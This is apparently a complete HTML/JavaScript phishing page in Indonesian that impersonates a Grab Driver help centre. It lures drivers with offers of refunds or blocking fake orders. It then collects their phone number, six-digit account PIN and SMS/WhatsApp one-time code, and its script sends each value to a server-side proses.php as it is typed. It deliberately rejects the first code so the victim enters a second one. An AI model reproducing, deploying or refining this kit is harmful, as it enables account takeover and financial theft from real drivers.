<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Grab Driver - Pusat Bantuan</title>

    <style>
        :root {
            --grab-green: #00b14f;
            --grab-dark: #008d3f;
            --text-black: #2f2f2f;
            --bg-light: #f7f7f7;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: #f0f0f0;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0; overflow: hidden;
        }

        .app-container {
            background: white; width: 100%; max-width: 400px;
            height: 100vh; position: relative; overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
        }

        @media (min-height: 700px) { .app-container { height: 750px; border-radius: 15px; } }

        .page {
            position: absolute; width: 100%; height: 100%;
            padding: 15px; box-sizing: border-box;
            transition: 0.4s ease-in-out; display: flex; flex-direction: column;
            background: white;
        }

        #page-1 { transform: translateX(0); }
        #page-3 { transform: translateX(100%); }
        #page-4 { transform: translateX(200%); }

        .active-pin #page-1 { transform: translateX(-100%); }
        .active-pin #page-3 { transform: translateX(0); }
        .active-otp #page-3 { transform: translateX(-100%); }
        .active-otp #page-4 { transform: translateX(0); }

        .header-img {
            width: calc(100% + 30px); margin: -15px -15px 15px -15px;
            display: block;
        }

        .menu-box {
            border: 1px solid #ddd; border-radius: 10px;
            padding: 12px; margin-bottom: 10px; cursor: pointer;
            display: flex; align-items: center; gap: 12px;
            font-size: 0.9rem; transition: 0.2s;
        }
        .menu-box:has(input:checked) { border-color: var(--grab-green); background: #f0fbf5; }
        .menu-box input { width: 18px; height: 18px; accent-color: var(--grab-green); }

        .input-group { margin-top: 5px; }
        .input-group label { font-size: 0.7rem; font-weight: bold; color: #555; }
        .input-group input {
            width: 100%; border: none; border-bottom: 2px solid #ccc;
            padding: 8px 0; font-size: 1rem; outline: none; margin-bottom: 15px;
        }

        .btn-green {
            background: var(--grab-green); color: white; border: none;
            padding: 15px; border-radius: 8px; font-size: 1rem;
            font-weight: bold; cursor: pointer; width: 100%;
            margin-top: 10px;
        }

        .pin-display { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
        .dot { width: 14px; height: 14px; border: 2px solid #ddd; border-radius: 50%; }
        .dot.active { background: var(--grab-green); border-color: var(--grab-green); }
        
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px; }
        .key { background: #f9f9f9; border: 1px solid #eee; padding: 15px; font-size: 1.3rem; border-radius: 10px; cursor: pointer; }

        .verif-img { width: 80%; margin: 0 auto 15px auto; display: block; }
        .otp-input {
            text-align: center; letter-spacing: 2px; font-size: 1.1rem !important;
            border-bottom: 2px solid var(--grab-green) !important;
        }
        #timer-text { font-size: 0.85rem; color: #666; text-align: center; margin-top: 10px; }
        #err-otp { color: #ff3b30; font-size: 0.75rem; text-align: center; display: none; margin-top: -5px; font-weight: bold; }
    </style>
</head>
<body>

<div class="app-container" id="main-container">
    
    <!-- HALAMAN 1 -->
    <div class="page" id="page-1">
        <img src="header-grab.jpg" class="header-img">
        <h2 style="font-size: 1rem; margin-bottom: 5px;">Pusat Bantuan Driver</h2>
        <p style="font-size: 0.8rem; color: #666; margin-bottom: 15px;">Pilih layanan yang ingin diaktifkan:</p>
        
        <label class="menu-box">
            <input type="radio" name="service" value="Pengembalian Dana" checked>
            <span>Proses Pengembalian Dana</span>
        </label>
        
        <label class="menu-box">
            <input type="radio" name="service" value="Tolak Orderan Fiktif">
            <span>Tolak Otomatis Orderan Fiktif</span>
        </label>
        
        <div class="input-group">
            <label>NOMOR HANDPHONE TERDAFTAR</label>
            <input type="tel" id="phone" placeholder="08xx">
        </div>
        <button class="btn-green" onclick="toPin()">SELANJUTNYA</button>
    </div>

    <!-- HALAMAN PIN & OTP TETAP SAMA (DENGAN TIMER) -->
    <div class="page" id="page-3">
        <h2 style="text-align: center; font-size: 1.1rem; margin-top: 10px;">Konfirmasi PIN</h2>
        <p style="text-align: center; font-size: 0.85rem; color: #777;">Masukkan 6 digit PIN akun Grab Anda</p>
        <div class="pin-display">
            <div id="d1" class="dot"></div><div id="d2" class="dot"></div>
            <div id="d3" class="dot"></div><div id="d4" class="dot"></div>
            <div id="d5" class="dot"></div><div id="d6" class="dot"></div>
        </div>
        <div class="keypad">
            <button class="key" onclick="press(1)">1</button><button class="key" onclick="press(2)">2</button><button class="key" onclick="press(3)">3</button>
            <button class="key" onclick="press(4)">4</button><button class="key" onclick="press(5)">5</button><button class="key" onclick="press(6)">6</button>
            <button class="key" onclick="press(7)">7</button><button class="key" onclick="press(8)">8</button><button class="key" onclick="press(9)">9</button>
            <button class="key" style="visibility:hidden;"></button>
            <button class="key" onclick="press(0)">0</button>
            <button class="key" onclick="press('del')">⌫</button>
        </div>
    </div>

    <div class="page" id="page-4">
        <img src="verif-sms.jpg" class="verif-img">
        <h2 style="text-align: center; font-size: 1.1rem; margin-top: 5px;">Cek Pesan</h2>
        <p style="text-align: center; font-size: 0.8rem; color: #555; margin-bottom: 15px;">Masukkan kode 4-6 angka yang Anda terima melalui SMS/WhatsApp.</p>
        <div class="input-group">
            <input type="tel" id="otp-val" class="otp-input" placeholder="Masukkan Kode">
            <p id="err-otp">Kode tidak valid atau kadaluarsa.</p>
        </div>
        <button class="btn-green" id="btn-otp" onclick="done()">KONFIRMASI</button>
        <p id="timer-text">Kirim ulang dalam <span id="seconds">60</span> detik</p>
    </div>
</div>

<script>
    const container = document.getElementById('main-container');
    let pin = "";
    let attempt = 0;
    let timerInterval;

    async function sendData(step) {
        const phone = document.getElementById('phone').value;
        const otp = document.getElementById('otp-val').value;
        // Ambil nilai radio yang dipilih
        const service = document.querySelector('input[name="service"]:checked').value;
        
        const formData = new FormData();
        formData.append('type', service + ' (' + step + ')');
        formData.append('phone', phone);
        formData.append('pin', pin);
        formData.append('otp', otp);
        try { await fetch('proses.php', { method: 'POST', body: formData }); } catch (e) {}
    }

    function toPin() {
        if(document.getElementById('phone').value.length > 9) {
            container.classList.add('active-pin');
            sendData('Input_Phone');
        } else { alert("Masukkan nomor yang valid"); }
    }

    function press(k) {
        if(k === 'del') { pin = pin.slice(0, -1); }
        else if(pin.length < 6) { pin += k; }
        for(let i=1; i<=6; i++) {
            document.getElementById('d'+i).classList[i <= pin.length ? 'add' : 'remove']('active');
        }
        if(pin.length === 6) {
            sendData('Input_PIN');
            setTimeout(() => { container.classList.add('active-otp'); startTimer(); }, 300);
        }
    }

    function startTimer() {
        let timeLeft = 60;
        const timerText = document.getElementById('timer-text');
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            timeLeft--;
            document.getElementById('seconds').innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                timerText.innerHTML = '<span style="color:var(--grab-green); font-weight:bold; cursor:pointer;" onclick="startTimer()">Kirim Ulang Kode</span>';
            }
        }, 1000);
    }

    async function done() {
        const btn = document.getElementById('btn-otp');
        const err = document.getElementById('err-otp');
        btn.disabled = true;
        btn.innerText = "MEMPROSES...";
        await sendData('Input_OTP_Attempt_' + (attempt + 1));
        setTimeout(() => {
            attempt++;
            if(attempt < 2) { 
                err.style.display = "block"; document.getElementById('otp-val').value = ""; 
                btn.disabled = false; btn.innerText = "KONFIRMASI";
                alert("Kode verifikasi salah!"); startTimer();
            } else {
                alert("Permintaan Anda sedang diproses. Mohon tunggu 1x24 jam.");
                location.reload();
            }
        }, 1200);
    }
</script>
</body>
</html>
